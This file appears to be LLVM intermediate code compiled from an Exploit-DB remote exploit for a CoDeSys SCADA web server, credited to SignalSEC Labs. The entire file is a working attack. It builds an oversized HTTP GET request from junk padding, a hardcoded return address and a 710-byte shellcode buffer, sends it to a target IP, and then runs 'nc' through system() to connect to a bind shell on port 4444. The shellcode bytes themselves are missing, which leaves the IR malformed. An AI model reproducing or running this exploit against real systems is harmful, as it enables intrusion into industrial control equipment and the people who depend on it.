; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_18187.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_18187.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8, i32, i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"target\00", align 1
@__const.main.ret = private unnamed_addr constant [5 x i8] c"gB\A7q\00", align 1
@__const.main.hellcode = private unnamed_addr constant [710 x i8] calign 16
@.str.1 = private unnamed_addr constant [44 x i8] c"\0A%s\0A by SignalSEC Labs - www.signalsec.com\0A\00", align 1
@name = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [22 x i8] c"\0AUsage: codesys [IP]\0A\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"GET /\00", align 1
@JUNK = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [10 x i8] c" HTTP/1.1\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [15 x i8] c"\0Asocket error\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [19 x i8] c"inet_aton problems\00", align 1
@.str.8 = private unnamed_addr constant [29 x i8] c"\0ACouldnt connect to target!\0A\00", align 1
@.str.9 = private unnamed_addr constant [27 x i8] c"\0ACan not send the payload\0A\00", align 1
@.str.10 = private unnamed_addr constant [38 x i8] c"\0A[+]Sending payload to SCADA system!\0A\00", align 1
@.str.11 = private unnamed_addr constant [43 x i8] c"\0A[+]Connecting to port 4444 to get shell!\0A\00", align 1
@.str.12 = private unnamed_addr constant [107 x i8] c"nc -vv ${target} 4444 || echo 'Sorry exploit failed! Change RET address or be sure target is not patched!'\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca [1600 x i8], align 16
  %12 = alloca i8*, align 8
  %13 = alloca [5 x i8], align 1
  %14 = alloca [710 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %10, align 8
  %15 = bitcast [5 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %15, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.ret, i32 0, i32 0), i64 5, i1 false)
  %16 = bitcast [710 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %16, i8* align 16 getelementptr inbounds ([710 x i8], [710 x i8]* @__const.main.hellcode, i32 0, i32 0), i64 710, i1 false)
  %17 = load i8*, i8** @name, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.1, i64 0, i64 0), i8* %17)
  %19 = load i32, i32* %4, align 4
  %20 = icmp slt i32 %19, 2
  br i1 %20, label %21, label %24

21:                                               ; preds = %2
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %23 = call i32 @exit(i32 -1) #4
  unreachable

24:                                               ; preds = %2
  %25 = load i8*, i8** %10, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @setenv(i8* %25, i8* %28, i32 1)
  %30 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %31 = call i32 @memset(i8* %30, i8 signext 0, i32 1600)
  %32 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  store i8* %32, i8** %12, align 8
  %33 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %34 = call i32 @strcat(i8* %33, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  store i32 1, i32* %7, align 4
  br label %35

35:                                               ; preds = %42, %24
  %36 = load i32, i32* %7, align 4
  %37 = icmp slt i32 %36, 776
  br i1 %37, label %38, label %45

38:                                               ; preds = %35
  %39 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %40 = load i8*, i8** @JUNK, align 8
  %41 = call i32 @strcat(i8* %39, i8* %40)
  br label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %7, align 4
  %44 = add nsw i32 %43, 1
  store i32 %44, i32* %7, align 4
  br label %35

45:                                               ; preds = %35
  %46 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %47 = getelementptr inbounds [5 x i8], [5 x i8]* %13, i64 0, i64 0
  %48 = call i32 @strcat(i8* %46, i8* %47)
  %49 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %50 = getelementptr inbounds [710 x i8], [710 x i8]* %14, i64 0, i64 0
  %51 = call i32 @strcat(i8* %49, i8* %50)
  %52 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %53 = call i32 @strcat(i8* %52, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0))
  %54 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %55 = call i32 @strcat(i8* %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0))
  %56 = load i32, i32* @AF_INET, align 4
  %57 = load i32, i32* @SOCK_STREAM, align 4
  %58 = call i32 @socket(i32 %56, i32 %57, i32 0)
  store i32 %58, i32* %6, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %63

60:                                               ; preds = %45
  %61 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  %62 = call i32 @exit(i32 1) #4
  unreachable

63:                                               ; preds = %45
  %64 = load i32, i32* @AF_INET, align 4
  %65 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  store i32 %64, i32* %65, align 4
  %66 = load i32, i32* @PORT, align 4
  %67 = call i32 @htons(i32 %66)
  %68 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %67, i32* %68, align 4
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 1
  %71 = load i8*, i8** %70, align 8
  %72 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %73 = call i32 @inet_aton(i8* %71, i32* %72)
  %74 = icmp ne i32 %73, 0
  br i1 %74, label %78, label %75

75:                                               ; preds = %63
  %76 = call i32 @perror(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.7, i64 0, i64 0))
  %77 = call i32 @exit(i32 2) #4
  unreachable

78:                                               ; preds = %63
  %79 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  %80 = call i32 @memset(i8* %79, i8 signext 0, i32 8)
  %81 = load i32, i32* %6, align 4
  %82 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %83 = call i32 @connect(i32 %81, %struct.sockaddr* %82, i32 4)
  %84 = icmp eq i32 %83, -1
  br i1 %84, label %85, label %90

85:                                               ; preds = %78
  %86 = call i32 @perror(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.8, i64 0, i64 0))
  %87 = load i32, i32* %6, align 4
  %88 = call i32 @close(i32 %87)
  %89 = call i32 @exit(i32 3) #4
  unreachable

90:                                               ; preds = %78
  %91 = load i32, i32* %6, align 4
  %92 = load i8*, i8** %12, align 8
  %93 = getelementptr inbounds [1600 x i8], [1600 x i8]* %11, i64 0, i64 0
  %94 = call i32 @strlen(i8* %93)
  %95 = call i32 @send(i32 %91, i8* %92, i32 %94, i32 0)
  store i32 %95, i32* %8, align 4
  %96 = load i32, i32* %8, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %103

98:                                               ; preds = %90
  %99 = call i32 @perror(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.9, i64 0, i64 0))
  %100 = load i32, i32* %6, align 4
  %101 = call i32 @close(i32 %100)
  %102 = call i32 @exit(i32 4) #4
  unreachable

103:                                              ; preds = %90
  %104 = load i32, i32* %6, align 4
  %105 = call i32 @close(i32 %104)
  %106 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.10, i64 0, i64 0))
  %107 = call i32 @sleep(i32 1)
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.11, i64 0, i64 0))
  %109 = call i32 @sleep(i32 2)
  %110 = call i32 @system(i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.12, i64 0, i64 0))
  %111 = call i32 @exit(i32 0) #4
  unreachable
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @setenv(i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_aton(i8*, i32*) #2

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @system(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
